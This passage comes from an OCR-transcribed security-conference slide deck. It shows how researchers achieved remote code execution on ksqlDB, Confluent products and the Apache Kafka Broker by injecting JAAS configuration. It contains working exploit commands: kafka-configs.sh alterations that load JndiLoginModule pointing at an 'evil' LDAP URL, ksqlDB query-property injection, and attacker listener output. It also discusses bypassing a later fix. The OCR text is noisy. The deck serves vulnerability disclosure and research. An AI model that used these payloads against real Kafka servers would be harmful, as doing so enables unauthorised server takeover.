ksql> INSERT INTO TEST (test) VALUES ('hi');
```

## Slide 64

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj Take over the ksqiIDB Server
Just try j .
ksqldb1 ry It out ino
Ur local env;
Nvironment
Editor Flow Streams Tables Persistent queries Settings
ah
2 -- CREATE OR REPLACE TABLE TEST (TEST STRING PRIMARY KEY) WITH (KAFKA_TOPIC='blocklist.test', KEY_FORMAT='KAFKA', PARTITIONS=1, REPLICAS=1, VALUE_FORMAT='J<‘
3 INSERT INTO TEST (test) VALUES (‘hi');
e@ Add query properties
auto.offset.reset =| Latest v w
+Add another field
```

## Slide 65

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[2024-11-22 09:26:29,713] INFO, im@Ms: 1732267589713 (org.
[2024-11-22 09:26:29,713] INFO| ProducerConfig|values:
acks = -1
1) Take over the ksqiDB Server
auto.include.jmx.reporter = true
batch.size = 16384
bootstrap.servers = [broker:29092]
buffer.memory = 33554432
client.dns.lookup = use_all_dns_
client.id = producer-2
compression.type = none
confluent.1lkc.id = null
confluent.proxy.protocol.client.
confluent.proxy.protocol.client.
confluent.proxy.protocol.client.
confluent.proxy.protocol.client.
connections.max.idle.ms = 540000
delivery.timeout.ms 120000
enable.idempotence = true
enable.metrics.push = true
interceptor.classes = []
key.serializer = class org.apache.kafka.common.serialization.
linger.ms = @
ips
address = null
mode = PROXY
port = null
version = NONE
```

## Slide 66

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[2024-11-22 09:26:29,713] INFO, i-m@Ms:
[2024-11-22 09:26:29,713] INFO| ProducerConfig|values:
1) Take over the ksqiDB Server
What do€s this mean?
1732267589713 (org.
acks = -1
auto.include.jmx.reporter = true
batch.size = 16384
bootstrap.servers = [broker:29092]
buffer.memory 33554432
client.dns.lookup
client.id = producer-2
compression.type = none
confluent.1lkc.id = null
confluent.proxy.protocol.client.
confluent.proxy.protocol.client.
confluent.proxy.protocol.client.
confluent.proxy.protocol.client.
connections.max.idle.ms
delivery.timeout.ms 120000
enable.idempotence true
enable.metrics.push true
interceptor.classes = []
key.serializer
use_all_dns_
540000
ips
address = null
mode = PROXY
port = null
version = NONE
class org.apache.kafka.common.serialization.
```

## Slide 67

❒ **Take over the ksqlDB Server**

## Slide 68

# ❒ **Take over the ksqlDB Server**

🤔 Can we modify the producer config?


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj Take over the ksqiIDB Server
‘ Can we modify the producer config?
—1. Execute Sql —2. Produce data—
A.
e°
```

## Slide 69

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1) Take over the ksqiDB Server
public void execute( What IS the Session
final ConfiguredStatement<InsertValues> statement,
final SessionProperties sessionProperties,
final KsqlExecutionContext executionContext,
final ServiceContext serviceContext
){
final InsertValues insertValues = statement.getStatement();
final MetaStore metaStore = re();
final KsqlConfig config = |statement.getSessionConfig() |getConfig(true) ;
final DataSource dataSource = getDataSource(config, metaStore,
insertValues);
validateInsert(insertValues.getColumns(), dataSource) ;
final ProducerRecord<byte[], byte[]> record =
buildRecord(statement, metaStore, dataSource, serviceContext) ;
try {
config.getProducerClientConfigProps());
```

## Slide 70

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj Take over the ksqiIDB Server
Just 9QueSs and try
2 —- CREATE OR REPLACE TABLE TEST (TEST STRING PRIMARY KEY) WITH (KAFKA_TOPIC='blocklist.test', KEY_FORMAT='KAFKA', PARTITIONS=1, REPLICAS=1, VALUE_FORMAT='Js
a INSERT INTO TEST (test) VALUES (‘hi');
e@ Add query properties
auto.offset.reset = | Latest v Ww
sasI.mechanism = | PLAIN w
+<Add another field Ru
```

## Slide 71

# ❒ **Take over the ksqlDB Server**

😍 Wow! We can control the config!

Previously

After modification

## Slide 72

# ❒ **Take over the ksqlDB Server**

### Send the PoC


> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj Take over the ksqiIDB Server
Send the PoC
e Add query properties
auto.offset.reset
sasl.mechanism
PLAIN
security.protocol
SASL_PLAINTEXT
sasl.login.callback
io.confluent.kafka.
sasl.jaas.config
com.sun.security.é
+-Add another field
Unable to run query. | stop ff Run query |
```

## Slide 73

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 78/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
1) Take over the ksqiDB Server
RCE here
[root@iZjécebh903gm@nqi4stieZ ~]# docker ps|grep ksqldb-server
[root@iZjécebh903gm@nq1l4stieZ ~]# docker exec -it 8b18d462dfa7 1s /tmp
hsperfdata_appuser snappy-1.1.10-1e91868d-f4a8-4996-a09a—-949250a92F40-.
kafka-streams Before vertx-cache-—9a1958db-d4b2-4047-b222-ca8930a5020b
[root@iZjécebh903gm@nq1l4stieZ ~]# docker exec -it 8b18d462dfa7 1s /tmp
hsperfdata_appuser snappy-1.1.10—-1e91868d-f4a8-4996-a09a—-949250a92F40-.
pwnnnn
```

## Slide 74

❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1) Take over the ksqiDB Server
Control Center
HOME CONTROLCENTER.CLUSTER
Cluster overview
Brokers
Topics
Connect
ksqIDB
Consumers
Replicators
Cluster settings
Health+ @
KSQLDB
ksqldb1
Editor Flow Streams Tables Persistent queries Settings
1 CREATE OR REPLACE TABLE TEST (TEST STRING PRIMARY KEY) WITH (KAFKA_TOPIC=
@ Add query properties
auto.offset.reset | = [ Latest v 13)
+Add another field
New to stream processing and ksqIDB? Check out our docume
on and ksqIDB exarr
, KEY_FORMAT=
All available streams and tables
ist] KSQL_PROCESSING_LOG
» PARTITIONS=1, REPLICAS=1, VALUE_FORMAT=
```

## Slide 75

# ❒ **A brief summary**

Using the bypass tactics We can take over

Kafka Connect

## Slide 76

# ❒ **A brief summary**

We have taken over the Confluent products of multiple cloud vendors.

## Slide 77

# ❒ **A brief summary**

Attacker-controlled Kafka Client's configuration

+

Bypass Tactics

RCE

## Slide 78

# 4. Uncovering Hidden Vulnerabilities in Kafka Broker

## Slide 79

# ❒ Why we target the Kafka Broker

Kafka Broker is the core component of the Kafka ecosystem

https://medium.com/@navdeepsharma/the-ecosystem-of-apache-kafka6087b621d16f

## Slide 80

# ❒ Why we target the Kafka Broker

Prior to this, Kafka Broker had no RCE vulnerability

## Slide 81

❒ How we find this vulnerability


> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj How we find this vulnerability
```

## Slide 82

# ❒ How we find this vulnerability

### Read official docs: initially just to bypass CVE-2023-25194

https://kafka.apache.org/documentation/

## Slide 83

# ❒ How we find this vulnerability

### An accidental discovery

https://kafka.apache.org/documentation/


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1) How we find this vulnerability
An accidental discovery
Adding and Removing Listeners
Listeners may be added or removed dynamically When a new listener is added, security configs
of the listener must be provided as listener configs with the listener prefix Listener.name.
{listenerName}. . If the new listener uses SASL, the JAAS configuration of the listener must
be provided using the JAAS configuration property sasl.jaas.config with the listener and
mechanism prefix. See JAAS configuration for Kafka brokers for details.
In Kafka version 1.1.x, the listener used by the inter-broker listener may not be updated
dynamically. To update the inter-broker listener to a new listener, the new listener may be added
on all brokers without restarting the broker. A rolling restart is then required to update
inter.broker. Listener.name .
```

## Slide 84

# ❒ How we find this vulnerability

😲 Wait, the Broker also supports JAAS!

https://kafka.apache.org/documentation/


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1) How we find this vulnerability
“) Wait, the Broker also supports JAAS!
Adding and Removing Listeners aie in
Listeners may be added or removed dynamically. When a new listener is added, security configs
of the listener must be provided as listener configs with the listener prefix Listener.name.
AAS configuration property sasl.jaas.config with the listener and
{listenerName}. .|If the new listener uses SASL, the JAAS configuration of the listener must
be provided using the
mechanism prefix. See JAAS configuration for Kafka brokers for details.
In Kafka version 1.1.x, the listener used by the inter-broker listener may not be updated
dynamically. To update the inter-broker listener to a new listener, the new listener may be added
on all brokers without restarting the broker. A rolling restart is then required to update
inter.broker. Listener.name .
```

## Slide 85

# ❒ **Introduce this feature**

### Normal Request


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 Introduce this feature
Normal Request
User Kafka New Listener
```

## Slide 86

# ❒ **Introduce this feature**

### Evil Request


> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 Introduce this feature
Evil Request
2. Receive and m—((
New Listener
ws oa . Send Request >
Hacker [ee
3. Send JNDI Request
Evil JNDI Server
```

## Slide 87

# ❒ **Set up the environment**

https://kafka.apache.org/downloads


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© Set up the environment
3.3.2
Released Jan 23, 2023
Release Notes
Source download: kafka-3.3.2-sre.tgz (asc, sha512)
Binary downloads:
o Scala 2.12 - kafka_2.12-3.3.2.tgz (asc, sha512)
o Scala2.13 - kafka_2.13-3.3.2.tgz (asc, sha512)
1 #!/bin/bash
2 rm -rf kafka_2.13-3.3.2
3 rm -rf /tmp/kraft-—combined-logs
4 tar -zxvf kafka_2.13-3.3.2.tgz
5 cd kafka_2.13-3.3.2
6 KAFKA_CLUSTER_ID="$(bin/kafka-storage.sh random-uuid)"
7 bin/kafka-storage.sh format -t $KAFKA_CLUSTER_ID -c config/kraft/server.properties
8 sed -i 's/localhost/127.0.0.1/' config/kraft/server.properties
9 bin/kafka-server-start.sh config/kraft/server.properties
```

## Slide 88

# ❒ **Exploit it step by step**

### GetBrokerConfig


> Recovered by OCR — confidence 82/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
GetBrokerConfig
@.1:9092 --describe --entity-type brokers --all
All configs for broker} 1 Jare:
log.cleaner.min.compaction.lag.ms=@ sensitive=false synonyms={DEFAULT_CONFIG:1log.cleaner.min.
offsets.topic.num.partitions=50 sensitive=false synonyms={DEFAULT_CONFIG:offsets.topic.num.pa
rtitions=50}
sasl.oauthbearer.jwks.endpoint.refresh.ms=360000@ sensitive=false synonyms={DEFAULT_CONFIG:sa
log.flush.interval.messages=9223372036854775807 sensitive=false synonyms={DEFAULT_CONFIG:1log.
flush.interval.messages=9223372036854775807}
controller.socket.timeout.ms=30000 sensitive=false synonyms={DEFAULT_CONFIG:controller.socket
. timeout .ms=30000}
principal.builder.class=org.apache.kafka.common.security.authenticator.DefaultKafkaPrincipalB
.security.authenticator.DefaultKafkaPrincipalBuilder}
log.flush.interval.ms=null sensitive=false synonyms={}
controller.quorum.request.timeout.ms=200@ sensitive=false synonyms={DEFAULT_CONFIG:controller
sasl.oauthbearer.expected.audience=null sensitive=false synonyms={}
min.insync.replicas=1 sensitive=false synonyms={DEFAULT_CONFIG:min.insync.replicas=1}
ry.threads.per.data.dir=1, DEFAULT_CONFIG:num.recovery.threads.per.data.dir=1}
```

## Slide 89

# ❒ **Exploit it step by step**

#### 1. Focus on the listeners configuration

#### 2. Using netstat to check the listening ports

## Slide 90

# ❒ **Exploit it step by step**

##### 1. Try to add a new listener

##### 2. The Broker receives the request

##### 3. Successfully Added!


> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
1. Try to add a new listener
92, CONTROLLER: //:9093]'
Completed updating config for broker 1.
2. The Broker receives the request
[2025-06-28 17:33:05,193] INFO [BrokerMetadataPublisher id=1] Updating broker 1 with new configuration : listeners -> SASL_PLAINTE
[2025-06-28 17:33:05,195] INFO KafkaConfig values:
advertised.listeners = PLAINTEXT://127.0.0.1:9092
alter.config.policy.class.name = null
alter.log.dirs.replication.quota.window.num = 11
alter.log.dirs.replication.quota.window.size.seconds = 1
authorizer.class.name =
auto.create.topics.enable = true
auto.leader.rebalance.enable = true
background.threads = 10
broker.heartbeat.interval.ms = 2000
3. Successfully Added!
```

## Slide 91

# ❒ **Exploit it step by step**

##### 1. Try to add a new listener

## Slide 92

# ❒ **Exploit it step by step**

😅 But in fact, the Broker will also throw an Exception


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
© But in fact, the Broker will also throw an Exception
[2025-26-28 17:33:05,201] INFO [SocketServer listenerType=BROKER, nodeId=1]
Point (null, 9094, ListenerName(SASL_PLAINTEXT) ,SASL_PLAINTEXT)) (kafka.network.SocketServer)
[2025-06-28 17:33:05,202] INFO Updated connection-accept-rate max connection creation rate to 2147483647 (kafka.network.Connection
Quotas)
[2025-06-28 17:33:05,202] INFO| Awaiting socket connections on 0.0.0.0:9094.
java.lang.IllegalArgumentException:
‘Adding data-plane listeners
for endpoints ArraySeq(End
(kafka.network.DataPlaneAcceptor)
[2025-06-28 17:33:05,204] ERROR Per-broker configs of 1 could not be applied: java.util.Collections$3@700f7402 (kafka.server.Dynam
icBrokerConfig)
Could not find a 'KafkaServer' or 'sasl_plaintext.KafkaServer' entry in the JAAS configuration
. System property 'java.security.auth.login.config' is not set
at
at
at
at
at
at
at
at
at
at
at
at
org.apache.kafka.common.
org.apache.kafka.common.
org.apache.kafka.common.
org.apache.kafka.common.
org.apache.kafka.common.
kafka.
kafka.
kafka
kafka
scala
kafka
kafka
network.Processor.<init>(SocketServer.scala:921)
security.JaasContext.load(JaasContext.java:96)
network.ChannelBuilders.create(ChannelBuilders.java:143)
network.ChannelBuilders.serverChannelBuilder(ChannelBuilders.java:107)
network.SocketServer.createDataPlaneAcceptorAndProcessors(SocketServer.scala:228)
```

## Slide 93

# ❒ **Exploit it step by step**

🧐 Wait, no JAAS configuration?

🤩 If we set the config, we can trigger JAAS process!


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
©) Wait, no JAAS configuration?
[2025-06-28 17:33:05,201] INFO [Soc
Point (null, 9094, ListenerName(SASL_P
[2025-06-28 17:33:05,202] INFO Upda
Quotas)
ketServer listenerType=BROKER, nodeId=1] |Addin
LAINTEXT),SASL_PLAINTEXT)) (kafka.network.Socket
ted connection-accept-rate max connection creation
data-plane listeners |for endpoints ArraySeq(End
ver)
te to 2147483647 (kafka.network.Connection
[2025-06-28 17:33:05,202] INFO| Awai
ting socket connections on 0.0.0.0:9094.| (kafka.networkNQataPlaneAcceptor)
[2025-06-28 17:33:05,204] ERROR Per
icBrokerConfig)
java.lang.IllegalArgumentException:
. System property 'java.security.au
at org.apache.kafka.common.
at org.apache.kafka.common.
at org.apache.kafka.common.
at org.apache.kafka.common.
at org.apache.kafka.common.
at kafka.network.Processor.
at kafka.network.Acceptor.n
at kafka.network.Acceptor.$
at scala.collection.immutab
at kafka.network.Acceptor.a
at kafka.network.DataPlaneA
at kafka.network.SocketServ
—broker configs of 1 could not be applied: java.util.Coll
ions$30@700f7402 (kafka.server.Dynam
Could not find a 'KafkaServer' or 'sasl_plaintext.KafkaServer' entry in the JAAS configuration
h.login.config' is not set
security.JaasContext.load(JaasContext.java:96)
network.ChannelBuilders.create(ChannelBuilders.java:143)
network.ChannelBuilders.serverChannelBuilder(ChannelBuilders.java:107)
<init>(SocketServer.scala:921)
ewProcessor(SocketServer.scala:829)
anonfun$addProcessors$1(SocketServer.scala:799)
le.Range. foreach$mVc$sp(Range.scala:190)
ddProcessors(SocketServer.scala:798)
cceptor.configure(SocketServer.scala:502)
er.createDataPlaneAcceptorAndProcessors(SocketServer.scala:228)
S If we set the config, we can trigger JAAS process!
```

## Slide 94

# ❒ **Exploit it step by step**

🤯 How to set the JAAS configuration?

## Slide 95

# ❒ **Exploit it step by step**

### 😉 Read the docs again, and find the answer

https://kafka.apache.org/documentation/#security_jaas_broker

## Slide 96

# ❒ **Exploit it step by step**

#### Configuration key

#### By default

#### Pwned in one hit?


> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
Configuration key
By default
1 listener.name.{listenerName}.{saslMechanism}.sasl.jaas.config sasl.enabled.mechanisms = [GSSAPT]
root@iZjécit8a@25m7gcof6pk47:~/kafka_?.13-3.3.7# bin/kafka-configs.sh —-bootstrap-server 127.0.0.1:9092 --alter --broker 1 --a
dd-config
'listener.name.sasl_plaintext.gssapi.sasl.jaas.config=[
com.sun.security.auth.module.JndiLoginModule required user.provid
9092, CONTROLLER: //:9093]'
Completed updating config for broker 1.
Pwned in one hit?
```

## Slide 97

❒ **Exploit it step by step**

😅 Throw a new Exception


> Recovered by OCR — confidence 88/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
© Throw a new Exception
[2025-06-30 15:49:39,946] ERROR Per-broker configs of 1 could not be applied: java.util.Collections$30@36368e43 (kafka.server.Dynan
icBrokerConfig)
org.apache.kafka.common.KafkaException: java.lang.IllegalArgumentException: No serviceName defined in either JAAS or Kafka config
at org.apache.kafka.common.network.ChannelBuilders.create(ChannelBuilders.java:192)
at org.apache.kafka.common.network.ChannelBuilders.serverChannelBuilder(ChannelBuilders.java:107)
at kafka.network.Processor.<init>(SocketServer.scala:921)
at kafka.network.Acceptor.newProcessor(SocketServer.scala:829)
at kafka.network.Acceptor. $anonfun$addProcessors$1(SocketServer.scala:799)
at scala.collection.immutable. Range. foreach$mVc$sp(Range.scala:190)
at kafka.network.Acceptor.addProcessors(SocketServer.scala:798)
```

## Slide 98

# ❒ **Exploit it step by step**

Sad != Solution. Code == Clues.


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
Sad != Solution. Code == Clues.
private static String getServiceName(Map<String, ?> configs, String contextName, Configuration configuration) {
List<AppConfigurationEntry> configEntries = Arrays.asList(configuration.getAppConfigurationEntry (contextName) ) ;
String jaasServiceName = JaasContext.configEntry0ption(configEntries, JaasUtils.SERVICE_NAME, null);
String configServiceName = (String) configs.get(SaslConfigs.SASL_KERBEROS_SERVICE_NAME) ;
if (jaasServiceName != null && configServiceName != null && !jaasServiceName.equals(configServiceName)) {
String message = String.format("Conflicting serviceName values found in JAAS and Kafka configs " +
"value in JAAS file %s, value in Kafka config %s", jaasServiceName, configServiceName) ;
throw new IlLLegalArgumentException(message) ;
if (jaasServiceName != null)
return jaasServiceName;
if (configServiceName != null)
return configServiceName;
throw new IllegalArgumentException("No serviceName defined in either JAAS or Kafka config");
public static final String SASL_KERBEROS_SERVICE_NAME = "sasl.kerberos.service.name";
```

## Slide 99

❒ **Exploit it step by step**


> Recovered by OCR — confidence 81/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
root@iZj6cit8a025m7gcofé6pk4Z:~/kafka_2.13-3.3.2# bin/kafka—configs.sh --bootstrap-server 127.0.0.1:9092 --alter --broker 1 --a
dd-config 'listener.name.sasl_plaintext.gssapi.sasl.jaas.config=[com.sun.security.auth.module.JndiLoginModule required user.provid
9092, CONTROLLER: //:9093]|,sasl.kerberos.service.name=Test'
Completed updating config for broker 1.
Listening on 0.0.0.8 1389
Connection received on 127.0.0.1 52890
```

## Slide 100

# ❒ **Exploit it step by step**

### Another solution

## Slide 101

❒ **We did it!**


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[I We did it!
( TO KAFKA BROKER
```

## Slide 102

# ❒ **Try to exploit a newer Kafka Broker**

Failed, why?


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(J Try to exploit a newer Kafka Broker
--alter --broker 1 --add-config 'listener.name.sasl_plaintext.plain.sasl.jaas.config=[com.sun.security
.auth.module.JndiLoginModule required user.provider.url="ldap://127.0.0.1:1389/evil" useFirstPass="true"
group.provider.url="xxx";],sasl.enabled.mechanisms=PLAIN, listeners=[SASL_PLAINTEXT://:9094, PLAINTEXT://:9
@92, CONTROLLER: //:9093]'
Completed updating config for broker 1.
Failed, why?
[2025-06-28 17:44:57,709] ERROR Per-broker configs of 1 could not be applied: java.util.Collections$3@2beb9
b51 (kafka.server.DynamicBrokerConfig)
java.lang.IllegalArgumentException: com.sun.security.auth.module.JndiLoginModule is not allowed. Update Sys
tem property 'org.apache.kafka.disallowed.login.modules' to allow com.sun.security.auth.module.JndiLoginMod
ule
at org.apache.kafka.common.security.JaasContext.throwIfLoginModuleIsNotAllowed(JaasContext.java:113
)
at org.apache.kafka.common.security.JaasContext.load(JaasContext.java:100)
at org.apache.kafka.common.security.JaasContext.loadServerContext(JaasContext.java:74)
at org.apache.kafka.common.network.ChannelBuilders.create(ChannelBuilders.java:143)
at org.apache.kafka.common.network.ChannelBuilders.serverChannelBuilder(ChannelBuilders.java:107)
at kafka.network.Processor.<init>(SocketServer.scala:921)
```

## Slide 103

# ❒ **Try to exploit a newer Kafka Broker**

### Root cause


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(J Try to exploit a newer Kafka Broker
Root cause
1 public class JaasContext {
2
3 public static JaasContext loadServerContext(ListenerName listenerName, String mechanism,
Map<String, ?> configs) {
4
5 Password dynamicJaasConfig = (Password) configs.get(mechanism.toLowerCase(Locale.ROOT) +
"." + SaslConfigs.SASL JAAS CONFIG);
6 return |load(Type.SERVER,| listenerContextName, GLOBAL_CONTEXT_NAME_SERVER,
dynamicJaasConfig);
7 }
8
9 public static JaasContext loadClientContext(Map<String, ?> configs) {
10 Password dynamicJaasConfig = (Password) configs.get(SaslConfigs.SASL_JAAS_CONFIG);
11 return! load(JaasContext.Type.CLIENT,} null, GLOBAL_CONTEXT_NAME_CLIENT,
dynamicJaasConfig) ;
12 }
13
14 static JaasContext load(JaasContext.Type contextType, String listenerContextName,
15 String globalContextName, Password dynamicJaasConfig) {
16 JaasConfig jaasConfig = new JaasConfig(globalContextName, dynamicJaasConfig.value());
17 AppConfigurationEntry[] contextModules =
jaasConfig.getAppConfigurationEntry(globalContextName) ;
19 throwIfLoginModuleIsNotAllowed(contextModules [0] );
20
```

## Slide 104

❒ **Try to exploit a newer Kafka Broker**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(J Try to exploit a newer Kafka Broker
FIND A NEW
VULNERABILITY
FIXED BY ACCIDENT
```

## Slide 105

# ❒ **But~**

### Remember we have a bypass method in Confluent!

## Slide 106

# ❒ **Set up the environment**

https://docs.confluent.io/platform/current/installation/docker/config-reference.html#cp-server-example


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© Set up the environment
-h
-p
KRaft mode
ZooKeeper mode
Generate a random-uuid using the kafka-storage tool:
/bin/kafka-storage random-uuid El
Assign the output to the cLusTer_iIp variable:
docker run -d \ El
--name=kafka-kraft \
kafka-kraft \
KAFKA_NODE_ID=1 \
KAFKA_LISTENER_SECURITY_PROTOCOL_MAP='CONTROLLER: PLAINTEXT, PLAINTEXT: PLAINTEXT, PLAINTEXT_HOST : PLAINTEX
KAFKA_ADVERTISED_LISTENERS=' PLAINTEXT: //kafka-kraft:29092,PLAINTEXT_HOST://localhost:9092' \
KAFKA_PROCESS_ROLES='broker,controller' \
KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR=1 \
KAFKA_CONTROLLER_QUORUM_VOTERS='1@kafka-kraft:29093' \
KAFKA_INTER_BROKER_LISTENER_NAME='PLAINTEXT' \
KAFKA_CONTROLLER_LISTENER_NAMES='CONTROLLER' \
confluentinc/cp-server:7.7.1
```

## Slide 107

# ❒ **Set up the environment**

Add a port mapping

##### Successfully started


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1) Set up the environment
Add a port mapping
1 docker run -d \
—-name=kafka-kraft \
—p 9092:9092 \
-p 9101:9101 \
-e KAFKA_NODE_ID=1 \
-e
KAFKA_LISTENER_SECURITY_PROTOCOL_MAP=' CONTROLLER: PLAINTEXT, PLAINTEXT: PLAINTEXT, PLAINTEXT_HOST: PLA
INTEXT' \
8 -e KAFKA_ADVERTISED_LISTENERS=' PLAINTEXT: //kafka—kraft:29092,PLAINTEXT_HOST://localhost:9092' \
9 -e KAFKA_PROCESS_ROLES='broker,controller' \
10 -e KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR=1 \
11 -e KAFKA_CONTROLLER_QUORUM_VOTERS=' 1@kafka—kraft:29093' \
12 -e KAFKA_LISTENERS=' PLAINTEXT: //kafka—kraft: 29092, CONTROLLER: //kafka-
kraft:29093,PLAINTEXT_HOST://0.0.0.0:9092' \
13 -e KAFKA_INTER_BROKER_LISTENER_NAME='PLAINTEXT' \
14 -e KAFKA_CONTROLLER_LISTENER_NAMES='CONTROLLER' \
15 -e CLUSTER_ID='q1Sh-9_ISia_zwGINzRvyQ' \
16 conf luentinc/cp-server:7.7.1
Successfully started
rokers -—-all
All configs for broker 1 are:
sasl.oauthbearer.jwks.endpoint.refresh.ms=3600000 sensitive=false synonyms={DEFAULT_CONFIG:sasl.oauthbearer.jwks.endpoint.refres
h.ms=3600000}
controller.socket.timeout.ms=3000@ sensitive=false synonyms={DEFAULT_CONFIG:controller.socket.timeout .ms=30000}
log.flush.interval.ms=null sensitive=false synonyms={}
min.insync.replicas=1 sensitive=false synonyms={DEFAULT_CONFIG:min.insync.replicas=1}
confluent.tier.cleaner.enable=false sensitive=false synonyms={DEFAULT_CONFIG:confluent.tier.cleaner.enable=false}
```

## Slide 108

# ❒ **Exploit it step by step**

#### 1. Get the listeners config

#### 2. Add a new listener, but throw an Exception


> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J Exploit it step by step
1. Get the listeners config
root@iZj6cit8a@25m7gcofépk4Z: ~/kafka_2.13-3.3.2# bin/kafka—configs.sh --bootstrap-server 127.0.0.1:9092 --describe --entity-type b
rokers --all|grep listeners
early.start.listeners=null sensitive=false synonyms={}
| listeners=PLAINTEXT: //kafka—kraft : 29092, CONTROLLER: //kafka-kraft : 29093, PLAINTEXT_HOST://0.0.0.0:9092 |sensitive=false synonyms={S
TATIC_BROKER_CONFIG: listeners=PLAINTEXT: //kafka—kraft : 29092, CONTROLLER: //kafka—kraft: 29093, PLAINTEXT_HOST://@.0.0.0:9092, DEFAULT_
CONFIG: listeners=PLAINTEXT://:9092}
advertised. listeners=PLAINTEXT://kafka—kraft: 29092, PLAINTEXT_HOST://localhost:9092 sensitive=false synonyms={STATIC_BROKER_CONFI
2
?
2. Add a new listener, but throw an Exception
root@iZj6cit8a@25m7gcofé6pk4Z:~/kafka_2.13-3.3.2# bin/kafka-configs.sh --bootstrap-server 127.0.@.1:9092 --alter --broker 1 --a
dd-config 'listener.name.sasl_plaintext.plain.sasl.jaas.config=[com.sun.security.auth.module.JndiLoginModule required user.provide
r.url="1dap://127.0.0.1:1389/evil" useFirstPass="true" group.provider.url="xxx";],sasl.enabled.mechanisms=PLAIN,|listeners=[SASL_PL
AINTEXT://:50000,|PLAINTEXT: //kafka—kraft : 29092, CONTROLLER: //kafka—kraft : 29093, PLAINTEXT_HOST://0.0.0.0:9092]'
Error while executing config command with args '--bootstrap-server 127.0.0.1:9092 --alter --broker 1 --add-config listener.name.sa
sl_plaintext.plain.sasl.jaas.config=[com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://127.0.0.1:138
9/evil" useFirstPass="true" group.provider.url="xxx";],sasl.enabled.mechanisms=PLAIN, listeners=[SASL_PLAINTEXT://:50000@, PLAINTEXT:
java.util.concurrent.ExecutionException: org.apache.kafka.common.errors.InvalidRequestException: Error creating broker li,
rom_'SASI Pl ATNTEXT://:5000@, Pl AINTEXT: //kafka-kraft : 29092, CONTROLLER: //kafka—kraft: 29093, PLAINTEXT_HOST://0.0.0.0:9092':| No secur
lity protocol defined for listener SASL_PLAINTEXT
at jJaVa.base/java.util.concurrent.cCompletableFuture.reportGet (CompletableFuture.java:396)
at org.apache.kafka.common.internals.KafkaFutureImpl.get(KafkaFutureImpl.java:180)
at kafka.admin.ConfigCommand$.alterConfig(ConfigCommand.scala:378)
at kafka.admin.ConfigCommand$.processCommand(ConfigCommand.scala:326)
at kafka.admin.ConfigCommand$.main(ConfigCommand.scala:97)
